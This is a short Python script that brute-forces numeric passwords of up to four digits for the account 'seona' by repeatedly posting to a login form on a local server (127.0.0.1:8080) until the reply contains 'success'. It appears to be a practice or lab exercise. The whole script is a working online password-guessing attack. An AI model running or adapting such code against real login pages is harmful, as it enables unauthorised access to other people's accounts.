import itertools
import requests

str = '0123456789'

for pwlen in range(1, 5):
    for password in itertools.product(str, repeat=pwlen):
        pw= ''.join(password)
        print(pw)
        loginpacket = {
            'id' : 'seona',
            'pw' : pw,
        }
        address = requests.post(f'http://127.0.0.1:8080/', data=loginpacket)
        if address.text.find('success') > 0:
            exit()
            


